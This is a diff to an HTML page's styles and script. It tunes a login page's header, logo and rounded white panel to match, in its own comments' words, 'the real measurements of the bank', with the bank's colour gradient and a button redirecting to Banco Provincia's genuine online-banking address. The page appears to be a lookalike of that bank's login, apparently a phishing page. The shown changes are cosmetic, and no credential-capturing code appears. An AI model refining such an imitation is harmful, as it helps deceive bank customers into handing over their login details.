@@ -16,7 +16,7 @@
 .oculto{display:none!important}
 
 /* --- header y logo con las medidas reales del banco --- */
-.layout.header{position:relative!important;height:auto!important;width:100%!important}
+.layout.header{position:relative!important;height:auto!important;width:100%!important;margin:0!important}
 .layout.header .header-gradient{
   height:calc(5.625rem + var(--safearea-top))!important;
   padding:calc(1rem + var(--safearea-top)) 0 0 0!important;
@@ -36,10 +36,19 @@
   .layout.header img.logo-web,.layout.header img.logo-print{height:2.875rem!important}
 }
 
-/* --- hoja blanca pegada y redondeada --- */
-.login-content{border-radius:0!important;box-shadow:none!important}
-.login-content-mobile{border-top-left-radius:1.5rem!important;border-top-right-radius:1.5rem!important;overflow:hidden}
-.row-login-content{margin:0!important}
+/* --- hoja blanca pegada con las esquinas redondeadas del banco --- */
+.login-content{background:transparent!important;border-radius:0!important;box-shadow:none!important}
+.row-login-content{position:relative!important;margin:0!important}
+.row-login-content::before{
+  content:"";position:absolute;top:0;left:0;width:100%;height:1.7rem;
+  background:linear-gradient(270deg,#26b4bd,#3daa35);z-index:0;
+}
+.row-login-content>.col{position:relative;z-index:1;padding:0}
+.login-content-mobile{
+  border-top-left-radius:1.5rem!important;
+  border-top-right-radius:1.5rem!important;
+  overflow:hidden;background:#fff!important;
+}
 .login-content-mobile .content{padding-top:1.2rem!important}
 </style>
 </head>
@@ -554,4 +563,4 @@ $("sinTok").onclick=function(){
 $("irBanco").onclick=function(){location.href="https://www.bancoprovincia.bancainternet.com.ar/spa/";};
 </script>
 </body>
-    </html>
+</html>
